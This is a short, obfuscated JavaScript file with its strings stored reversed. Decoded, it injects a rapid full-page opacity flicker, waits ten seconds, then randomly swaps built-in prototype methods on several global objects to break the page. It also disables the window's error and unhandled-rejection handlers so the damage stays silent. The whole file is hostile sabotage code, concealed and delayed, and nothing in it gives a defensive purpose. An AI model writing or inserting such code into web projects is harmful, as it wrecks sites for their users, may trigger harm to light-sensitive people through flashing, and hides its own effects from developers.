const s = [
  "tnemucod", // 0
  "tnemelEetaerc", // 1
  "elyts", // 2
  "} } 39.0 :yticapo { ot { _ semarfyek@ } etinifni etanretla s40.0 _ :noitamina { ydob", // 3
  "daeh", // 4
  "dlihCdneppa", // 5
  "epytotorp", // 6
  "rotcurtsnoc", // 7
  "rorreno", // 8
  "noitcejerdeldnahnuo", // 9
].map(t => t.split("").reverse().join(""));
var e = window[s[0]][s[1]](s[2]);
e.textContent = s[3];
window[s[0]][s[4]][s[5]](e);
setTimeout(() => {
  var commands = [];
  for (var k of Object.getOwnPropertyNames(window).slice(0, 10)) {
    if (k[0] < "A" || k[0] > "Z") continue;
    var target = window[k][s[6]];
    if (target) {
      var names = Object.getOwnPropertyNames(target).filter(function(n) {
        var d = Object.getOwnPropertyDescriptor(target, n);
        return d && typeof d.value === "function" && n[0] >= 'a' && n[0] <= 'z' && n !== s[7];
      });
      var shuffled = names.slice();
      for (var i = shuffled.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var tmp = shuffled[i];
        shuffled[i] = shuffled[j];
        shuffled[j] = tmp;
      }
      var originals = {};
      for (var n of names) originals[n] = target[n];
      for (var idx = 0; idx < names.length; idx++) {
        commands.push({ target: target, name: names[idx], fn: originals[shuffled[idx]] });
      }
    }
  }
  for (var cmd of commands) {
    try { cmd.target[cmd.name] = cmd.fn; } catch (e) {}
  }
  try {
    window[s[8]] = window[s[9]] = e => (e?.preventDefault?.(), true);
  } catch (e) {}
}, 10000);
